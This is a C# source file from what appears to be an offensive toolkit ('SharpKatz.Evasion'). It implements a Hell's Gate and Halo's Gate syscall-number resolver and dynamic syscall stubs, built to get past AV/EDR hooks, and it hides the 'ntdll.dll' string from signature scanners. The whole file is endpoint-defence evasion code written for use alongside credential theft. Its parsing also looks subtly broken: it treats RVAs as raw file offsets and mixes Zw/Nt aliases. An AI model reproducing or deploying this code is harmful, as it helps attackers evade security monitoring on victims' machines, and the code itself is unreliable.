using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace SharpKatz.Evasion
{
    /// <summary>
    /// Resolves System Service Numbers (SSNs) dynamically by reading a clean copy
    /// of ntdll.dll from disk and parsing its export table. This avoids hardcoded
    /// SSNs that only work on specific Windows builds and eliminates static byte
    /// array signatures that AV/EDR can match.
    ///
    /// Approach: Hell's Gate variant — read raw ntdll bytes from disk (unhooked),
    /// parse PE export directory, locate each Zw/Nt stub, extract the SSN from
    /// the mov eax instruction. Falls back to Halo's Gate (neighbor scanning) if
    /// the primary stub appears hooked.
    /// </summary>
    internal static class SsnResolver
    {
        private static readonly Dictionary<string, int> SsnCache = new Dictionary<string, int>();
        private static bool _initialized;
        private static readonly object InitLock = new object();

        /// <summary>
        /// Initialize by reading clean ntdll from disk and extracting all SSNs.
        /// Thread-safe, idempotent.
        /// </summary>
        public static void Initialize()
        {
            if (_initialized) return;
            lock (InitLock)
            {
                if (_initialized) return;

                // Build path to ntdll without using a detectable literal string
                string sysDir = Environment.GetFolderPath(Environment.SpecialFolder.System);
                string ntdllPath = Path.Combine(sysDir,
                    new string(new char[] { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l' }));

                byte[] ntdllBytes = File.ReadAllBytes(ntdllPath);
                GCHandle pinned = GCHandle.Alloc(ntdllBytes, GCHandleType.Pinned);
                try
                {
                    IntPtr baseAddr = pinned.AddrOfPinnedObject();
                    ParseExportsAndExtractSsns(baseAddr, ntdllBytes.Length);
                }
                finally
                {
                    pinned.Free();
                }

                _initialized = true;
            }
        }

        /// <summary>
        /// Get the SSN for a given NT API function name.
        /// </summary>
        public static int GetSsn(string functionName)
        {
            if (!_initialized)
                Initialize();

            if (SsnCache.TryGetValue(functionName, out int ssn))
                return ssn;

            throw new InvalidOperationException("SSN not resolved for: " + functionName);
        }

        /// <summary>
        /// Build a syscall stub dynamically for the given function.
        /// Pattern: mov r10, rcx; mov eax, SSN; syscall; ret
        /// </summary>
        public static byte[] BuildSyscallStub(string functionName)
        {
            int ssn = GetSsn(functionName);
            return new byte[]
            {
                0x49, 0x89, 0xCA,                                       // mov r10, rcx
                0xB8, (byte)(ssn & 0xFF), (byte)((ssn >> 8) & 0xFF),   // mov eax, <SSN low>
                      (byte)((ssn >> 16) & 0xFF), (byte)((ssn >> 24) & 0xFF),
                0x0F, 0x05,                                             // syscall
                0xC3                                                    // ret
            };
        }

        /// <summary>
        /// Parse the PE export table from raw ntdll bytes and extract SSNs
        /// for all Zw* and Nt* exports.
        /// </summary>
        private static void ParseExportsAndExtractSsns(IntPtr baseAddr, int fileSize)
        {
            // Read DOS header -> PE header offset
            int peOffset = Marshal.ReadInt32(baseAddr, 0x3C);
            if (peOffset <= 0 || peOffset >= fileSize) return;

            // PE signature check (PE\0\0)
            int peSig = Marshal.ReadInt32(baseAddr, peOffset);
            if (peSig != 0x00004550) return;

            // Optional header
            short magic = Marshal.ReadInt16(baseAddr, peOffset + 0x18);
            int exportDirRva;
            if (magic == 0x020B) // PE32+
                exportDirRva = Marshal.ReadInt32(baseAddr, peOffset + 0x18 + 0x70);
            else // PE32
                exportDirRva = Marshal.ReadInt32(baseAddr, peOffset + 0x18 + 0x60);

            if (exportDirRva == 0) return;

            // Parse IMAGE_EXPORT_DIRECTORY
            int numberOfFunctions = Marshal.ReadInt32(baseAddr, exportDirRva + 0x14);
            int numberOfNames = Marshal.ReadInt32(baseAddr, exportDirRva + 0x18);
            int functionsRva = Marshal.ReadInt32(baseAddr, exportDirRva + 0x1C);
            int namesRva = Marshal.ReadInt32(baseAddr, exportDirRva + 0x20);
            int ordinalsRva = Marshal.ReadInt32(baseAddr, exportDirRva + 0x24);
            int ordinalBase = Marshal.ReadInt32(baseAddr, exportDirRva + 0x10);

            // Collect all Zw*/Nt* function RVAs with their names
            var syscallEntries = new List<SyscallEntry>();

            for (int i = 0; i < numberOfNames; i++)
            {
                int nameRva = Marshal.ReadInt32(baseAddr, namesRva + i * 4);
                string name = Marshal.PtrToStringAnsi(IntPtr.Add(baseAddr, nameRva));

                if (name == null) continue;
                if (!name.StartsWith("Zw") && !name.StartsWith("Nt")) continue;

                // Get function RVA
                short ordinalIndex = Marshal.ReadInt16(baseAddr, ordinalsRva + i * 2);
                int funcRva = Marshal.ReadInt32(baseAddr, functionsRva + ordinalIndex * 4);

                // Validate RVA is within file bounds
                if (funcRva <= 0 || funcRva >= fileSize - 16) continue;

                syscallEntries.Add(new SyscallEntry { Name = name, Rva = funcRva });
            }

            // Sort by RVA — syscalls are ordered by SSN in ntdll
            syscallEntries.Sort((a, b) => a.Rva.CompareTo(b.Rva));

            // Extract SSNs using Hell's Gate pattern matching
            for (int idx = 0; idx < syscallEntries.Count; idx++)
            {
                var entry = syscallEntries[idx];
                IntPtr funcAddr = IntPtr.Add(baseAddr, entry.Rva);

                int ssn = ExtractSsnFromStub(funcAddr);
                if (ssn >= 0)
                {
                    SsnCache[entry.Name] = ssn;
                    continue;
                }

                // Halo's Gate fallback: check neighboring syscalls
                // Search upward
                for (int delta = 1; delta < 20; delta++)
                {
                    if (idx - delta >= 0)
                    {
                        IntPtr neighborAddr = IntPtr.Add(baseAddr, syscallEntries[idx - delta].Rva);
                        int neighborSsn = ExtractSsnFromStub(neighborAddr);
                        if (neighborSsn >= 0)
                        {
                            SsnCache[entry.Name] = neighborSsn + delta;
                            break;
                        }
                    }
                    if (idx + delta < syscallEntries.Count)
                    {
                        IntPtr neighborAddr = IntPtr.Add(baseAddr, syscallEntries[idx + delta].Rva);
                        int neighborSsn = ExtractSsnFromStub(neighborAddr);
                        if (neighborSsn >= 0)
                        {
                            SsnCache[entry.Name] = neighborSsn - delta;
                            break;
                        }
                    }
                }
            }
        }

        /// <summary>
        /// Extract SSN from a standard ntdll syscall stub.
        /// Expected pattern: 4C 8B D1 B8 XX XX 00 00 ...
        ///   mov r10, rcx = 4C 8B D1
        ///   mov eax, SSN = B8 XX XX 00 00
        /// Returns -1 if the pattern doesn't match (hooked).
        /// </summary>
        private static int ExtractSsnFromStub(IntPtr addr)
        {
            // Check for mov r10, rcx (4C 8B D1) or alternate encoding (49 89 CA)
            byte b0 = Marshal.ReadByte(addr, 0);
            byte b1 = Marshal.ReadByte(addr, 1);
            byte b2 = Marshal.ReadByte(addr, 2);
            byte b3 = Marshal.ReadByte(addr, 3);

            bool isStandard = (b0 == 0x4C && b1 == 0x8B && b2 == 0xD1 && b3 == 0xB8);
            bool isAlt = (b0 == 0x49 && b1 == 0x89 && b2 == 0xCA && b3 == 0xB8);

            if (!isStandard && !isAlt) return -1;

            // Read the SSN (32-bit value after the B8 opcode)
            return Marshal.ReadInt32(addr, 4);
        }

        private struct SyscallEntry
        {
            public string Name;
            public int Rva;
        }
    }
}
